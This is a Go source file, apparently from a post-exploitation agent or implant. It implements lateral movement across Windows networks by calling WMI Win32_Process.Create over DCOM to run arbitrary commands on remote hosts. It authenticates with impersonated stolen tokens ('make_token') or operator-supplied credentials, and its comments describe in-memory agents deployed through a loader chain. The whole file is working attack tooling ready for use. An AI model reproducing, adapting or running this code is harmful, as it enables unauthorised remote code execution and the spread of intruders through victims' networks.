//go:build windows

package main

import (
	"errors"
	"fmt"
	"runtime"
	"strings"
	"sync"
	"sync/atomic"
	"syscall"
	"time"
	"unsafe"
)

// Native WMI lateral execution: a COM/DCOM call chain replaces wmic.exe and
// its PowerShell fallback. The pinned worker impersonates the active make_token
// identity; COM cloaking uses that thread token for outbound authentication.

const (
	coinitMultithreaded      = 0x0
	clsctxInprocServer       = 0x1
	rpcCAuthnWinnt           = 10
	rpcCAuthnGssKerberos     = 16
	rpcCAuthzNone            = 0
	rpcCAuthnLevelDefault    = 0
	rpcCAuthnLevelPktPrivacy = 6
	rpcCImpLevelImpersonate  = 3
	eoacDynamicCloaking      = 0x40
	vtBstr                   = 8
	vtI4                     = 3
	cimString                = 8
)

var (
	wmiSecurityOnce sync.Once
	wmiSecurityErr  error
	// wmiSecurityHR preserves the original HRESULT of the single
	// CoInitializeSecurity attempt, whatever the classification decided.
	wmiSecurityHR uintptr
	// wmiSecurityCalls counts initializeWMISecurity calls: more than one
	// means every caller after the first was served from the once-cache
	// without a new COM call.
	wmiSecurityCalls      atomic.Uint32
	ole32                 = syscall.NewLazyDLL("ole32.dll")
	oleaut32              = syscall.NewLazyDLL("oleaut32.dll")
	procCoInitializeEx    = ole32.NewProc("CoInitializeEx")
	procCoInitializeSec   = ole32.NewProc("CoInitializeSecurity")
	procCoUninitialize    = ole32.NewProc("CoUninitialize")
	procCoCreateInstance  = ole32.NewProc("CoCreateInstance")
	procCoSetProxyBlanket = ole32.NewProc("CoSetProxyBlanket")
	procSysAllocString    = oleaut32.NewProc("SysAllocString")
	procSysFreeString     = oleaut32.NewProc("SysFreeString")
)

// initializeWMISecurity establishes process-wide thread-token cloaking once.
// A prior incompatible initialization fails closed instead of using the process
// identity for the initial remote connection; the one exception is a
// memory-hosted agent, whose PowerShell host (the CLR) configured process
// COM security before this code ran — rejecting that state would block every
// lateral deployment from an in-memory source, the flagship scenario of the
// loader chain.
func initializeWMISecurity() error {
	wmiSecurityCalls.Add(1)
	wmiSecurityOnce.Do(func() {
		hr, _, _ := procCoInitializeSec.Call(0, ^uintptr(0), 0, 0,
			rpcCAuthnLevelDefault, rpcCImpLevelImpersonate, 0, eoacDynamicCloaking, 0)
		wmiSecurityHR = hr
		wmiSecurityErr = wmiSecurityResult(hr)
	})
	return wmiSecurityErr
}

// wmiSecurityInitReport describes the single COM security initialization the
// process actually got: the original CoInitializeSecurity HRESULT, the
// classification that decided whether deployments may proceed, and whether
// the requested settings took effect at all. An accepted RPC_E_TOO_LATE only
// means COM security was already initialized elsewhere — it is never
// evidence that the cloaking and impersonation levels requested here were
// applied. Whether the reporting call hit the once-cache distinguishes a
// fresh initialization from process state predating the probe.
func wmiSecurityInitReport() string {
	requested := fmt.Sprintf(
		"requested=authn-level:%d(imp-level:%d caps:0x%x(dynamic-cloaking))",
		rpcCAuthnLevelDefault, rpcCImpLevelImpersonate, eoacDynamicCloaking)
	if wmiSecurityHR == 0 {
		return fmt.Sprintf("%s original-hr=0x%08x classified=applied calls=%d",
			requested, wmiSecurityHR, wmiSecurityCalls.Load())
	}
	classified := "other-failure"
	switch {
	case wmiSecurityHR == rpcETooLate && wmiSecurityErr == nil:
		// A memory-hosted agent proceeded; the requested settings are
		// not guaranteed effective — never report them as applied.
		classified = "accepted-TOO-LATE-foreign-initialization-host-proceeds"
	case wmiSecurityHR == rpcETooLate:
		classified = "fails-closed-TOO-LATE"
	}
	detail := fmt.Sprintf("%s original-hr=0x%08x classified=%s calls=%d",
		requested, wmiSecurityHR, classified, wmiSecurityCalls.Load())
	if wmiSecurityErr != nil {
		detail += " err=" + wmiSecurityErr.Error()
	}
	return detail
}

type comGUID struct {
	data1 uint32
	data2 uint16
	data3 uint16
	data4 [8]byte
}

var (
	clsidWbemLocator = comGUID{0x4590F811, 0x1D3A, 0x11D0, [8]byte{0x89, 0x1F, 0x00, 0xAA, 0x00, 0x4B, 0x2E, 0x24}}
	iidIWbemLocator  = comGUID{0xDC12A687, 0x737F, 0x11CF, [8]byte{0x88, 0x4D, 0x00, 0xAA, 0x00, 0x4B, 0x2E, 0x24}}
)

// variant holds a BSTR or I4 VARIANT value; the layout matches the x64
// VARIANT header followed by the union.
type variant struct {
	vt       uint16
	reserved [6]byte
	value    uintptr
	tail     [8]byte
}

// comCallHR dispatches a COM interface method by vtable slot and returns the
// raw HRESULT, so diagnostics can record exact result codes. Callers must
// not hand it a nil interface.
func comCallHR(iface, slot uintptr, args ...uintptr) uintptr {
	vtable := *(*uintptr)(unsafe.Pointer(iface))
	method := *(*uintptr)(unsafe.Pointer(vtable + slot*8))
	if method == 0 {
		return 0x80004003 // E_POINTER for a missing vtable entry
	}
	hr, _, _ := syscall.SyscallN(method, append([]uintptr{iface}, args...)...)
	return hr
}

// comCall invokes a COM interface method by vtable slot. All arguments must
// be pointer-sized; the x64 calling convention ignores the extra ones the
// callee does not read.
func comCall(iface, slot uintptr, args ...uintptr) error {
	if hr := comCallHR(iface, slot, args...); hr != 0 {
		return fmt.Errorf("COM method %d failed: 0x%08x", slot, hr)
	}
	return nil
}

func comRelease(iface uintptr) {
	if iface == 0 {
		return
	}
	vtable := *(*uintptr)(unsafe.Pointer(iface))
	method := *(*uintptr)(unsafe.Pointer(vtable + 16)) // IUnknown::Release
	_, _, _ = syscall.SyscallN(method, iface)
}

func sysAllocString(value string) uintptr {
	pointer, err := syscall.UTF16PtrFromString(value)
	if err != nil {
		return 0
	}
	handle, _, _ := procSysAllocString.Call(uintptr(unsafe.Pointer(pointer)))
	return handle
}

func sysFreeString(handle uintptr) {
	if handle != 0 {
		procSysFreeString.Call(handle)
	}
}

// wmiAuthentication allocates the ConnectServer BSTR and the proxy's UTF-16
// principal. The caller owns the BSTR and must free it with sysFreeString.
func wmiAuthentication(host string) (uintptr, uintptr, *uint16, error) {
	authnSvc := uintptr(rpcCAuthnWinnt)
	var authority uintptr
	var serverPrincipal *uint16
	if !lateralHostIsIP(host) {
		authnSvc = rpcCAuthnGssKerberos
		var err error
		principal := "HOST/" + host
		serverPrincipal, err = syscall.UTF16PtrFromString(principal)
		if err != nil {
			return 0, 0, nil, fmt.Errorf("encode WMI Kerberos server principal: %w", err)
		}
		// ConnectServer requires a length-prefixed BSTR, not an LPCWSTR.
		authority = sysAllocString("kerberos:" + principal)
		if authority == 0 {
			return 0, 0, nil, errors.New("allocate WMI Kerberos authority")
		}
	}
	return authnSvc, authority, serverPrincipal, nil
}

// secWinNTAuthIdentity is SEC_WINNT_AUTH_IDENTITY_W: explicit credentials
// handed to CoSetProxyBlanket so WMI method calls authenticate with the
// operator-supplied identity instead of the process or thread token. Flag 2
// marks the strings as Unicode.
type secWinNTAuthIdentity struct {
	user       *uint16
	userLength uint32
	domain     *uint16
	domainLen  uint32
	password   *uint16
	passLen    uint32
	flags      uint32
}

// wmiConnectIdentity prepares ConnectServer's explicit credential BSTRs.
// Per the ConnectServer contract the domain rides in strAuthority
// (NTLMDOMAIN:) and never inside strUser, so explicit deployments always
// authenticate through NTLM — matching the network-only semantics of the
// LOGON_NEW_CREDENTIALS token the worker impersonates for SMB staging.
func wmiConnectIdentity(identity *winrmCredentials) (user, password, authority uintptr, blanket *secWinNTAuthIdentity, err error) {
	if identity == nil {
		return 0, 0, 0, nil, nil
	}
	if strings.ContainsRune(identity.user, '\\') {
		return 0, 0, 0, nil, errors.New("lateral identity user must not embed a domain")
	}
	user = sysAllocString(identity.user)
	password = sysAllocString(identity.password)
	if user == 0 || password == 0 {
		sysFreeString(user)
		sysFreeString(password)
		return 0, 0, 0, nil, errors.New("allocate WMI credential strings")
	}
	if identity.domain != "" {
		// ConnectServer rejects a domain specified in both strUser and
		// strAuthority, so the domain only travels here.
		authority = sysAllocString("ntlmdomain:" + identity.domain)
		if authority == 0 {
			sysFreeString(user)
			sysFreeString(password)
			return 0, 0, 0, nil, errors.New("allocate WMI authority string")
		}
	}
	userText, userErr := syscall.UTF16PtrFromString(identity.user)
	domainText, domainErr := syscall.UTF16PtrFromString(identity.domain)
	passwordText, passwordErr := syscall.UTF16PtrFromString(identity.password)
	if userErr != nil || domainErr != nil || passwordErr != nil {
		sysFreeString(user)
		sysFreeString(password)
		sysFreeString(authority)
		return 0, 0, 0, nil, errors.New("encode lateral identity for WMI")
	}
	blanket = &secWinNTAuthIdentity{
		user: userText, userLength: uint32(len(identity.user)),
		domain: domainText, domainLen: uint32(len(identity.domain)),
		password: passwordText, passLen: uint32(len(identity.password)),
		flags: 2, // SEC_WINNT_AUTH_IDENTITY_UNICODE
	}
	runtime.KeepAlive(blanket)
	return user, password, authority, blanket, nil
}

// wmiWorkerStart backs the process-lived WMI COM worker. The once holds
// both the start error (a failed apartment initialization is permanent
// for this worker) and the request channel every production WMI operation
// funnels through.
var wmiWorkerStart struct {
	sync.Once
	requests chan func()
	err      error
}

// wmiComWorker lazily starts and returns the process-lived WMI COM worker:
// one goroutine pinned to one OS thread for the agent's lifetime, holding
// the COM apartment (a single CoInitializeEx, never balanced by
// CoUninitialize) and the process-wide COM security initialization. Every
// production Win32_Process.Create — the deployment code path — executes on
// that thread, so the in-process WMI client keeps one continuous COM
// lifetime across deployments instead of the per-attempt
// initialization/teardown cycle that turned the second connect under a
// network-only thread identity into a wrong-account denial. The worker
// thread is an isolated, exclusively owned thread: callers never run COM
// on their own threads, every identity-holding flow in this agent locks its
// OS thread, so the worker's thread starts (and is verified to stay) free
// of foreign impersonations.
func wmiComWorker() (chan func(), error) {
	wmiWorkerStart.Do(func() {
		requests := make(chan func())
		wmiWorkerStart.requests = requests
		ready := make(chan error, 1)
		go func() {
			runtime.LockOSThread()
			hr, _, _ := procCoInitializeEx.Call(0, coinitMultithreaded)
			if hr != 0 && hr != 1 {
				ready <- fmt.Errorf("CoInitializeEx failed: 0x%08x", hr)
				return
			}
			// Never CoUninitialize: the validated lifecycle keeps the
			// apartment alive for the process, which is what separates it
			// from the per-attempt cycle that failed in the field.
			if err := initializeWMISecurity(); err != nil {
				ready <- err
				return
			}
			if present, err := wmiThreadTokenPresent(); err != nil {
				ready <- fmt.Errorf("verify the WMI worker thread entry: %w", err)
				return
			} else if present {
				ready <- identityBoundaryFailure(errors.New("the WMI worker thread carries a foreign thread token at entry"))
				return
			}
			ready <- nil
			for fn := range requests {
				fn()
			}
		}()
		wmiWorkerStart.err = <-ready
	})
	return wmiWorkerStart.requests, wmiWorkerStart.err
}

// wmiThreadTokenPresent reports whether the calling thread carries an
// impersonation token, the enforced clean-state check of the production
// WMI identity discipline.
func wmiThreadTokenPresent() (bool, error) {
	open := advapi32.NewProc("OpenThreadToken")
	var token syscall.Token
	ok, _, openErr := open.Call(^uintptr(1), 0x0008, 1, uintptr(unsafe.Pointer(&token)))
	if ok == 0 {
		if errno, valid := openErr.(syscall.Errno); valid && errno == syscall.Errno(1008) {
			return false, nil
		}
		return false, openErr
	}
	_ = token.Close()
	return true, nil
}

// wmiCreateProcess executes Win32_Process.Create over DCOM, funneled
// through the process-lived WMI COM worker so every deployment shares one
// continuous COM lifetime. Without an explicit identity it authenticates
// with the caller-captured ambient token (the active make_token state as of
// the lateral dispatch, carried through the payload as a handle) applied
// on the worker thread for the duration of the operation — the cloaked
// path the validated lifecycle proved reliable under
// initialization-and-revert-per-operation. An explicit identity travels in
// ConnectServer's strUser/strPassword and the proxy blanket, so the DCOM
// handshake never depends on thread identity at all. The worker enforces
// the identity discipline instead of observing it: an unclean thread at
// entry or after the operation's revert aborts or fails with the
// identity-boundary fault, never silently, and a failed cleanup turns the
// operation's result into an error — never into a success. The marshal
// wait is bounded by the caller's budget: one stalled operation cannot
// hold other targets' waiters past their own deployment deadline (the
// stalled chain itself still owns the worker until the OS call returns —
// no user-mode code can preempt it, and the report says so).
func wmiCreateProcess(host, command string, identity *winrmCredentials, ambient uintptr, wait time.Duration) error {
	requests, err := wmiComWorker()
	if err != nil {
		return fmt.Errorf("start the WMI COM worker: %w", err)
	}
	if wait <= 0 {
		wait = 30 * time.Second
	}
	done := make(chan error, 1)
	requests <- func() {
		done <- wmiCreateProcessChain(host, command, identity, ambient)
	}
	select {
	case err := <-done:
		return err
	case <-time.After(wait):
		return fmt.Errorf("the WMI COM worker did not finish within %.0fs; a stalled operation on another target may still hold the worker", wait.Seconds())
	}
}

// wmiCleanupTokenPresent is the deferred post-revert verification seam:
// Windows regressions substitute it to pin that a failed cleanup turns the
// operation's result into an error, without manipulating real tokens.
var wmiCleanupTokenPresent = wmiThreadTokenPresent

// wmiCocreateRetrySleep is the bounded-backoff sleep seam: Windows tests
// substitute an instant stub so retry coverage does not wait real time.
var wmiCocreateRetrySleep = time.Sleep

// cocreateWbemLocatorRaw is the raw activation seam: production always calls
// the real ole32 CoCreateInstance through wmiCocreateRaw; Windows tests
// substitute scripted HRESULTs to drive the retry path.
var cocreateWbemLocatorRaw = wmiCocreateRaw

// wmiCocreateRaw performs one raw in-process activation of the WbemLocator
// class and returns the out pointer and the HRESULT without interpretation.
func wmiCocreateRaw() (locator, hr uintptr) {
	hr, _, _ = procCoCreateInstance.Call(
		uintptr(unsafe.Pointer(&clsidWbemLocator)), 0, clsctxInprocServer,
		uintptr(unsafe.Pointer(&iidIWbemLocator)), uintptr(unsafe.Pointer(&locator)))
	return locator, hr
}

// cocreateWbemLocator creates the local in-process WbemLocator, retrying the
// transient ERROR_KEY_DELETED class-store failure on the bounded schedule
// decided by cocreateRetryDelay. The call is purely local — it resolves
// CLSID_WbemLocator through the registry (the merged per-user and machine
// classes view) and loads the in-proc server — so retries never resend
// anything to the destination host. The retried failure mode is a
// delete-pending registry key under the caller's profile, the observed
// 0x800703FA from in-memory agents whose WinRM host kept the user token
// without owning the profile hive. An activation that still fails after the
// schedule is exhausted keeps reporting the raw HRESULT.
func cocreateWbemLocator() (uintptr, error) {
	var lastHR uintptr
	for attempt := 0; ; attempt++ {
		locator, hr := cocreateWbemLocatorRaw()
		if hr == 0 {
			return locator, nil
		}
		lastHR = hr
		delay, retry := cocreateRetryDelay(hr, attempt)
		if !retry {
			break
		}
		wmiCocreateRetrySleep(delay)
	}
	if lastHR == hrErrorKeyDeleted {
		return 0, fmt.Errorf("CoCreateInstance(WbemLocator) failed: 0x%08x: local class-store delete-pending state persisted through %d retries",
			lastHR, len(wmiCocreateRetryDelays))
	}
	return 0, fmt.Errorf("CoCreateInstance(WbemLocator) failed: 0x%08x", lastHR)
}

// wmiCreateProcessChain runs one Win32_Process.Create on the COM worker
// thread. The COM apartment and process security are already initialized
// there; this chain owns only the per-operation identity: a verified clean
// entry, the ambient token applied for the connect when no explicit
// credentials were supplied, and a verified revert on every exit path —
// a revert or verification failure joins the operation's error, so
// cleanup failure never reports success.
func wmiCreateProcessChain(host, command string, identity *winrmCredentials, ambient uintptr) (err error) {
	if present, err := wmiThreadTokenPresent(); err != nil {
		return identityBoundaryFailure(fmt.Errorf("verify the WMI worker thread entry: %w", err))
	} else if present {
		return identityBoundaryFailure(errors.New("the WMI worker thread carries a thread token at operation entry"))
	}
	impersonated := false
	if identity == nil && ambient != 0 {
		if ok, _, err := procImpersonateLoggedOnUser.Call(ambient); ok == 0 {
			return fmt.Errorf("apply the ambient WMI identity: %w", err)
		}
		impersonated = true
	}
	if impersonated {
		defer func() {
			ok, _, revertErr := procRevertToSelf.Call()
			if ok == 0 {
				err = errors.Join(err, identityBoundaryFailure(fmt.Errorf("revert the ambient WMI identity: %w", revertErr)))
				return
			}
			if present, verifyErr := wmiCleanupTokenPresent(); verifyErr != nil {
				err = errors.Join(err, identityBoundaryFailure(fmt.Errorf("verify the WMI worker thread after revert: %w", verifyErr)))
			} else if present {
				err = errors.Join(err, identityBoundaryFailure(errors.New("the WMI worker thread carries a thread token after the operation")))
			}
		}()
	}
	authnSvc, authorityAmbient, serverPrincipal, err := wmiAuthentication(host)
	if err != nil {
		return err
	}
	defer sysFreeString(authorityAmbient)
	defer runtime.KeepAlive(serverPrincipal)
	identityUser, identityPassword, identityAuthority, identityBlanket, err := wmiConnectIdentity(identity)
	if err != nil {
		return err
	}
	defer sysFreeString(identityUser)
	defer sysFreeString(identityPassword)
	defer sysFreeString(identityAuthority)
	defer runtime.KeepAlive(identityBlanket)
	locator, err := cocreateWbemLocator()
	if err != nil {
		return err
	}
	defer comRelease(locator)
	namespace := sysAllocString(`\\` + host + `\root\cimv2`)
	defer sysFreeString(namespace)
	if namespace == 0 {
		return errors.New("allocate WMI namespace string")
	}
	var services uintptr
	// IWbemLocator::ConnectServer (slot 3): [namespace, user, password,
	// locale, securityFlags, authority, context, out]. Ambient deployments
	// keep the worker thread's impersonated identity (user/password NULL);
	// explicit credentials replace the Kerberos authority with the NTLM
	// domain of the payload.
	authority := authorityAmbient
	authnService := authnSvc
	if identity != nil {
		authority = identityAuthority
		authnService = rpcCAuthnWinnt
	}
	if err := comCall(locator, 3, namespace, identityUser, identityPassword, 0, 0,
		authority, 0,
		uintptr(unsafe.Pointer(&services))); err != nil {
		return fmt.Errorf("WMI connect to %s: %w", host, err)
	}
	defer comRelease(services)
	// The blanket binds the SSPI identity of every WMI call on the proxy:
	// dynamic cloaking for ambient deployments, an explicit auth identity
	// when the operator supplied credentials.
	if identity != nil {
		if hr, _, _ := procCoSetProxyBlanket.Call(
			services, rpcCAuthnWinnt, rpcCAuthzNone, 0,
			rpcCAuthnLevelPktPrivacy, rpcCImpLevelImpersonate, uintptr(unsafe.Pointer(identityBlanket)), 0,
		); hr != 0 {
			return fmt.Errorf("CoSetProxyBlanket failed: 0x%08x", hr)
		}
		runtime.KeepAlive(identityBlanket)
	} else if hr, _, _ := procCoSetProxyBlanket.Call(
		services, authnService, rpcCAuthzNone, uintptr(unsafe.Pointer(serverPrincipal)),
		rpcCAuthnLevelPktPrivacy, rpcCImpLevelImpersonate, 0, eoacDynamicCloaking,
	); hr != 0 {
		return fmt.Errorf("CoSetProxyBlanket failed: 0x%08x", hr)
	}
	classPath := sysAllocString("Win32_Process")
	defer sysFreeString(classPath)
	methodName := sysAllocString("Create")
	defer sysFreeString(methodName)
	if classPath == 0 || methodName == 0 {
		return errors.New("allocate WMI strings")
	}
	var classObject uintptr
	// IWbemServices::GetObject (slot 6).
	if err := comCall(services, 6, classPath, 0, 0,
		uintptr(unsafe.Pointer(&classObject)), 0); err != nil {
		return fmt.Errorf("WMI get Win32_Process on %s: %w", host, err)
	}
	defer comRelease(classObject)
	var inSignature, outSignature uintptr
	// IWbemClassObject::GetMethod (slot 19, including IUnknown).
	if err := comCall(classObject, 19, methodName, 0,
		uintptr(unsafe.Pointer(&inSignature)), uintptr(unsafe.Pointer(&outSignature))); err != nil {
		return fmt.Errorf("WMI get Win32_Process.Create: %w", err)
	}
	if outSignature != 0 {
		defer comRelease(outSignature)
	}
	if inSignature == 0 {
		return errors.New("WMI Create method has no input signature")
	}
	defer comRelease(inSignature)
	var inInstance uintptr
	// IWbemClassObject::SpawnInstance (slot 15).
	if err := comCall(inSignature, 15, 0, uintptr(unsafe.Pointer(&inInstance))); err != nil {
		return fmt.Errorf("WMI spawn Create input: %w", err)
	}
	defer comRelease(inInstance)
	commandLine := sysAllocString(command)
	defer sysFreeString(commandLine)
	if commandLine == 0 {
		return errors.New("allocate WMI command line")
	}
	propertyName, err := syscall.UTF16PtrFromString("CommandLine")
	if err != nil {
		return err
	}
	arguments := variant{vt: vtBstr, value: commandLine}
	// IWbemClassObject::Put (slot 5).
	if err := comCall(inInstance, 5, uintptr(unsafe.Pointer(propertyName)), 0,
		uintptr(unsafe.Pointer(&arguments)), cimString); err != nil {
		return fmt.Errorf("WMI set CommandLine: %w", err)
	}
	var outParams uintptr
	// IWbemServices::ExecMethod (slot 24).
	if err := comCall(services, 24, classPath, methodName, 0, 0, inInstance,
		uintptr(unsafe.Pointer(&outParams)), 0); err != nil {
		return fmt.Errorf("WMI Win32_Process.Create on %s: %w", host, err)
	}
	if outParams == 0 {
		return errors.New("WMI Create returned no output parameters")
	}
	defer comRelease(outParams)
	resultName, err := syscall.UTF16PtrFromString("ReturnValue")
	if err != nil {
		return err
	}
	var returnValue variant
	// IWbemClassObject::Get (slot 4).
	if err := comCall(outParams, 4, uintptr(unsafe.Pointer(resultName)), 0,
		uintptr(unsafe.Pointer(&returnValue)), 0, 0); err != nil {
		return fmt.Errorf("WMI read ReturnValue: %w", err)
	}
	if returnValue.vt == vtI4 && int32(returnValue.value) != 0 {
		return fmt.Errorf("WMI Win32_Process.Create returned %d", int32(returnValue.value))
	}
	return nil
}
